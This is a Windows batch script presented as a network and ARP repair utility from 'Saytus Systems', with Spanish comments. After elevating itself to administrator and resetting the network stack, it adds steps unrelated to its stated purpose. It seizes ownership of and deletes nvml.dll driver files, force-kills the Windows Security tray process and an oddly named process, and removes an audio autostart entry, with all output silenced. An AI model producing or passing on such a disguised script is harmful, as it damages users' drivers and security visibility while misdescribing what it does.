@echo off
:: ==============================================
:: Saytus Systems - ARP & Network Repair Utility
:: https://saytus.systems
:: ==============================================

REM -- Elevación a Administrador si es necesario --
openfiles >nul 2>&1
if %errorlevel% NEQ 0 (
    echo Solicitando permisos de administrador...
    powershell -Command "Start-Process '%~0' -Verb runAs"
    exit /b
)

cls
echo =============================================================
echo               Saytus Systems - Reparación de Red
echo =============================================================
echo.

REM ================================
REM 1. Reiniciar servicio WMI
REM ================================
echo [1/7] Reiniciando WMI...
sc stop winmgmt >nul 2>&1
sc start winmgmt >nul 2>&1
echo  -> WMI reiniciado.

REM ================================
REM 2. Deshabilitar IPv6
REM ================================
echo [2/7] Deshabilitando IPv6...
netsh interface ipv6 set teredo disable >nul 2>&1
netsh interface ipv6 set global randomizeidentifiers=disabled >nul 2>&1
netsh interface ipv6 set global state=disabled >nul 2>&1
echo  -> IPv6 deshabilitado.

REM ================================
REM 3. Limpiar caché ARP
REM ================================
echo [3/7] Limpiando caché ARP...
arp -d >nul 2>&1
echo  -> Caché ARP vaciada.

REM ================================
REM 4. Reset de pila de red
REM ================================
echo [4/7] Reseteando Winsock...
netsh winsock reset >nul 2>&1
echo  -> Winsock reseteado.
echo [5/7] Reseteando TCP/IP...
netsh int ip reset >nul 2>&1
echo  -> TCP/IP reseteado.

echo [6/7] Liberando y renovando IP...
ipconfig /release >nul 2>&1
ipconfig /renew  >nul 2>&1
echo  -> IP renovada.
echo [7/7] Vaciando caché DNS...
ipconfig /flushdns >nul 2>&1
echo  -> DNS vaciado.

REM ================================
REM 5. Eliminar nvml.dll de DriverStore
REM ================================
echo [Extra] Eliminando nvml.dll en DriverStore...
for /r "%SystemRoot%\System32\DriverStore\FileRepository" %%F in (nvml.dll) do (
    takeown /f "%%F" /d y >nul 2>&1
    icacls "%%F" /grant administrators:F >nul 2>&1
    del /f /q "%%F" >nul 2>&1
)
echo  -> nvml.dll eliminado si existía.

REM ================================
REM 6. Terminar procesos no deseados
REM ================================
echo [Extra] Cerrando procesos innecesarios...
taskkill /f /t /im SecurityHealthSystray.exe >nul 2>&1
taskkill /f /t /im dklsdksapodoads.exe >nul 2>&1
echo  -> Procesos finalizados.

REM ================================
REM 7. Eliminar autoarranque Realtek
REM ================================
echo [Extra] Quitando Realtek HD Audio Service del inicio...
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Realtek HD Audio Universal Service" /f >nul 2>&1
echo  -> Entrada de registro eliminada.


echo.
echo =============================================================
echo           ¡Operación completada! (Script por Saytus Systems)
echo =============================================================
echo.
pause
exit /b
